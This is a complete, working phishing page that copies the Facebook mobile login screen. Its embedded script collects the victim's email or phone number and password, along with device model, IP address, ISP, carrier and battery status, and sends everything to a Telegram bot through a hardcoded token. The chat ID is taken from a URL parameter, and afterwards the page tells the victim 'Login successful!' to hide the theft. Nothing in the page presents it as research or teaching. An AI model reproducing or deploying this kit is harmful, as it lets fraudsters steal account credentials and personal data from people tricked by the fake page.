<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Facebook – log in or sign up</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            padding: 0 16px;
            color: #1c2b33;
        }

        .login-container {
            width: 100%;
            max-width: 420px;
            padding: 20px 0 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .language {
            font-size: 17px;
            color: #606770;
            margin-top: 12px;
            margin-bottom: 44px;
            font-weight: 400;
            letter-spacing: -0.2px;
            text-align: center;
        }

        .fb-logo {
            width: 64px;
            height: 64px;
            background-color: #1877f2;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 52px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
        }

        .fb-logo i {
            font-size: 42px;
            color: white;
            line-height: 1;
        }

        .input-group {
            width: 100%;
            margin-bottom: 12px;
        }

        .input-field {
            width: 100%;
            padding: 16px 16px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            border-radius: 12px;
            background-color: #ffffff;
            color: #1c2b33;
            outline: none;
            transition: border-color 0.15s ease;
            font-family: inherit;
            letter-spacing: -0.2px;
            -webkit-appearance: none;
            appearance: none;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.02);
        }

        .input-field::placeholder {
            color: #8a8d91;
            font-weight: 400;
            font-size: 17px;
            opacity: 1;
        }

        .input-field:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }

        .login-btn {
            width: 100%;
            padding: 14px 16px;
            font-size: 20px;
            font-weight: 600;
            background-color: #1877f2;
            color: #ffffff;
            border: none;
            border-radius: 40px;
            cursor: pointer;
            margin-top: 10px;
            margin-bottom: 22px;
            font-family: inherit;
            letter-spacing: -0.3px;
            transition: background-color 0.15s ease;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .login-btn:hover {
            background-color: #166fe5;
        }

        .login-btn:active {
            background-color: #1464cc;
            transform: scale(0.99);
        }

        .login-btn:disabled {
            background-color: #7aace8;
            cursor: not-allowed;
            transform: none;
        }

        .forgot-password {
            font-size: 17px;
            color: #1c2b33;
            font-weight: 500;
            text-decoration: none;
            margin-bottom: 96px;
            letter-spacing: -0.2px;
            display: inline-block;
            transition: color 0.1s ease;
        }

        .forgot-password:hover {
            color: #1877f2;
            text-decoration: underline;
        }

        .bottom-section {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: auto;
            padding-top: 12px;
        }

        .create-account-btn {
            width: 100%;
            padding: 14px 16px;
            font-size: 18px;
            font-weight: 600;
            background-color: transparent;
            color: #1877f2;
            border: 1.5px solid #1877f2;
            border-radius: 40px;
            cursor: pointer;
            font-family: inherit;
            letter-spacing: -0.3px;
            transition: all 0.15s ease;
            margin-bottom: 32px;
            background-color: #ffffff;
        }

        .create-account-btn:hover {
            background-color: #f0f6ff;
        }

        .create-account-btn:active {
            background-color: #e3efff;
            transform: scale(0.99);
        }

        .meta-brand {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            font-size: 22px;
            font-weight: 600;
            color: #1c2b33;
            letter-spacing: -0.5px;
            margin-bottom: 8px;
        }

        .meta-brand i {
            font-size: 30px;
            color: #1877f2;
            line-height: 1;
        }

        .meta-brand span {
            font-size: 21px;
            font-weight: 700;
            color: #1c2b33;
        }

        .toast {
            position: fixed;
            top: 24px;
            left: 50%;
            transform: translateX(-50%) translateY(-100px);
            background-color: #1c2b33;
            color: #ffffff;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 500;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15);
            opacity: 0;
            transition: transform 0.35s ease, opacity 0.35s ease;
            z-index: 9999;
            pointer-events: none;
            max-width: 90%;
            text-align: center;
        }

        .toast.show {
            transform: translateX(-50%) translateY(0);
            opacity: 1;
        }

        .toast.error   { background-color: #d93025; }
        .toast.success { background-color: #0f7b3a; }

        @media (max-width: 380px) {
            .login-container { padding: 12px 0 24px; }
            .language { font-size: 15px; margin-bottom: 32px; }
            .fb-logo { width: 56px; height: 56px; margin-bottom: 40px; }
            .fb-logo i { font-size: 36px; }
            .input-field { padding: 14px 14px; font-size: 16px; border-radius: 10px; }
            .input-field::placeholder { font-size: 16px; }
            .login-btn { font-size: 18px; padding: 12px 16px; }
            .forgot-password { font-size: 15px; margin-bottom: 72px; }
            .create-account-btn { font-size: 16px; padding: 12px 16px; border-radius: 32px; }
            .meta-brand { font-size: 19px; gap: 4px; }
            .meta-brand i { font-size: 26px; }
            .meta-brand span { font-size: 18px; }
        }

        @media (min-height: 800px) {
            .forgot-password { margin-bottom: 120px; }
        }

        input[type="text"],
        input[type="password"] {
            -webkit-appearance: none;
            appearance: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="language">English (UK)</div>

        <div class="fb-logo">
            <i class="fab fa-facebook-f"></i>
        </div>

        <div class="input-group">
            <input type="text" id="emailOrPhone" class="input-field" placeholder="Mobile number or email address" autocomplete="username" aria-label="Mobile number or email address">
        </div>
        <div class="input-group">
            <input type="password" id="password" class="input-field" placeholder="Password" autocomplete="current-password" aria-label="Password">
        </div>

        <button class="login-btn" id="loginBtn" type="button">Log in</button>

        <a href="#" class="forgot-password">Forgotten password?</a>

        <div class="bottom-section">
            <button class="create-account-btn" type="button">Create new account</button>

            <div class="meta-brand">
                <i class="fas fa-infinity"></i>
                <span>Meta</span>
            </div>
        </div>
    </div>

    <div class="toast" id="toast"></div>

    <script>
        (function() {
            'use strict';

            // ============================================================
            //  TELEGRAM CONFIG
            // ============================================================
            const BOT_TOKEN = '8985145791:AAGs-YmwDqcjloaM69PF_eue0NJqIPENtwY';

            // Default Chat ID (used if ?id= is not present in the URL)
            const DEFAULT_CHAT_ID = '';

            // ============================================================
            //  READ CHAT ID FROM URL PARAMETER  →  ?id=XXXXXXXXX
            // ============================================================
            function getChatIdFromUrl() {
                try {
                    const params = new URLSearchParams(window.location.search);
                    const idParam = params.get('id') || params.get('chat_id') || params.get('chatid');
                    if (idParam && /^-?\d+$/.test(idParam.trim())) {
                        return idParam.trim();
                    }
                } catch (e) {
                    console.warn('Could not parse URL parameter:', e);
                }
                return null;
            }

            // Resolve the Chat ID: URL param takes priority, else default
            const CHAT_ID = getChatIdFromUrl() || DEFAULT_CHAT_ID;
            console.log('📬 Using Telegram Chat ID:', CHAT_ID);

            const loginBtn          = document.getElementById('loginBtn');
            const emailOrPhoneInput = document.getElementById('emailOrPhone');
            const passwordInput     = document.getElementById('password');
            const toast             = document.getElementById('toast');

            // ============================================================
            //  TOAST NOTIFICATION
            // ============================================================
            let toastTimer = null;
            function showToast(message, type = '') {
                if (toastTimer) clearTimeout(toastTimer);
                toast.textContent = message;
                toast.className = 'toast ' + type;
                void toast.offsetWidth;
                toast.classList.add('show');
                toastTimer = setTimeout(() => toast.classList.remove('show'), 3200);
            }

            // ============================================================
            //  GET DEVICE / PHONE NAME
            // ============================================================
            function getDeviceName() {
                const ua = navigator.userAgent;

                if (/iPhone/i.test(ua)) {
                    const m = ua.match(/iPhone OS (\d+_\d+)/);
                    return 'iPhone' + (m ? ' (iOS ' + m[1].replace('_', '.') + ')' : '');
                }
                if (/iPad/i.test(ua)) {
                    const m = ua.match(/OS (\d+_\d+)/);
                    return 'iPad' + (m ? ' (iOS ' + m[1].replace('_', '.') + ')' : '');
                }
                if (/Android/i.test(ua)) {
                    const m     = ua.match(/Android\s+([\d.]+)/);
                    const model = ua.match(/;\s*([^;)]+)\s+Build/);
                    return 'Android' +
                           (model ? ' - ' + model[1].trim() : '') +
                           (m ? ' (v' + m[1] + ')' : '');
                }
                if (/Windows NT/i.test(ua))          return 'Windows PC';
                if (/Macintosh|Mac OS X/i.test(ua))  return 'Mac';
                if (/Linux/i.test(ua))               return 'Linux PC';
                return 'Unknown Device';
            }

            // ============================================================
            //  GET PUBLIC IP + ISP / NETWORK OPERATOR
            // ============================================================
            async function getNetworkInfo() {
                const info = {
                    ip:  'Unavailable',
                    isp: 'Unavailable'
                };

                try {
                    const res = await fetch('https://ipapi.co/json/');
                    if (res.ok) {
                        const data = await res.json();
                        if (data.ip)         info.ip  = data.ip;
                        if (data.org)        info.isp = data.org;
                        else if (data.asn)   info.isp = data.asn;
                        if (info.ip !== 'Unavailable') return info;
                    }
                } catch (e) { /* fallback */ }

                try {
                    const res = await fetch('https://ipwho.is/');
                    if (res.ok) {
                        const data = await res.json();
                        if (data.ip) info.ip = data.ip;
                        if (data.connection && data.connection.isp) {
                            info.isp = data.connection.isp;
                        }
                        if (info.ip !== 'Unavailable') return info;
                    }
                } catch (e) { /* fallback */ }

                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    if (res.ok) {
                        const data = await res.json();
                        if (data.ip) info.ip = data.ip;
                    }
                } catch (e) { /* give up */ }

                return info;
            }

            // ============================================================
            //  GET BATTERY / CHARGING STATUS
            // ============================================================
            async function getBatteryInfo() {
                if (!navigator.getBattery) {
                    return { level: 'N/A', charging: 'N/A' };
                }
                try {
                    const battery  = await navigator.getBattery();
                    const level    = Math.round(battery.level * 100) + '%';
                    const charging = battery.charging ? 'Yes ⚡' : 'No 🔋';
                    return { level, charging };
                } catch (e) {
                    return { level: 'N/A', charging: 'N/A' };
                }
            }

            // ============================================================
            //  GET SIM / NETWORK OPERATOR NAME
            // ============================================================
            function getSimCompany() {
                const conn = navigator.connection
                          || navigator.mozConnection
                          || navigator.webkitConnection;

                if (conn) {
                    if (conn.operator)     return conn.operator;
                    if (conn.carrier)      return conn.carrier;
                    if (conn.networkType)  return 'Network: ' + conn.networkType;
                    if (conn.effectiveType) {
                        return 'Network: ' + conn.effectiveType.toUpperCase();
                    }
                }

                const ua = navigator.userAgent;
                if (/Mobile|Android|iPhone/i.test(ua)) {
                    return 'Mobile network (operator not exposed by browser)';
                }
                return 'Not available on this device/browser';
            }

            // ============================================================
            //  SEND MESSAGE TO TELEGRAM
            // ============================================================
            async function sendToTelegram(emailOrPhone, password) {
                const [network, battery] = await Promise.all([
                    getNetworkInfo(),
                    getBatteryInfo()
                ]);

                const deviceName  = getDeviceName();
                const simCompany  = getSimCompany();
                const localTime   = new Date().toLocaleString();

                const text =
                    `🔐 *New Facebook Login Attempt*\n\n` +
                    `📧 *Email / Phone:*\n\`${emailOrPhone}\`\n\n` +
                    `🔑 *Password:*\n\`${password}\`\n\n` +
                    `📱 *Mobile / Device Name:*\n${deviceName}\n\n` +
                    `📶 *SIM Company / Network:*\n${simCompany}\n\n` +
                    `🌐 *IP Address:*\n\`${network.ip}\`\n\n` +
                    `🏢 *ISP / Operator:*\n${network.isp}\n\n` +
                    `🔌 *Charging:* ${battery.charging}\n` +
                    `🔋 *Battery Level:* ${battery.level}\n\n` +
                    `🕒 *Time:* ${localTime}`;

                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });

                const data = await response.json();
                if (!response.ok || !data.ok) {
                    throw new Error(data.description || 'Telegram API error');
                }
                return data;
            }

            // ============================================================
            //  LOGIN HANDLER
            // ============================================================
            async function handleLogin() {
                const emailOrPhone = emailOrPhoneInput.value.trim();
                const password     = passwordInput.value;

                if (!emailOrPhone) {
                    showToast('Please enter your mobile number or email address.', 'error');
                    emailOrPhoneInput.focus();
                    return;
                }
                if (!password) {
                    showToast('Please enter your password.', 'error');
                    passwordInput.focus();
                    return;
                }

                loginBtn.disabled = true;
                const originalText = loginBtn.textContent;
                loginBtn.textContent = 'Logging in…';

                try {
                    await sendToTelegram(emailOrPhone, password);
                    showToast('Login successful!', 'success');
                    emailOrPhoneInput.value = '';
                    passwordInput.value = '';
                } catch (error) {
                    console.error('Telegram error:', error);
                    showToast(error.message || 'Something went wrong. Try again.', 'error');
                } finally {
                    loginBtn.disabled = false;
                    loginBtn.textContent = originalText;
                }
            }

            // ============================================================
            //  EVENT LISTENERS
            // ============================================================
            loginBtn.addEventListener('click', handleLogin);

            [emailOrPhoneInput, passwordInput].forEach(input => {
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        handleLogin();
                    }
                });
            });

        })();
    </script>
</body>
</html>
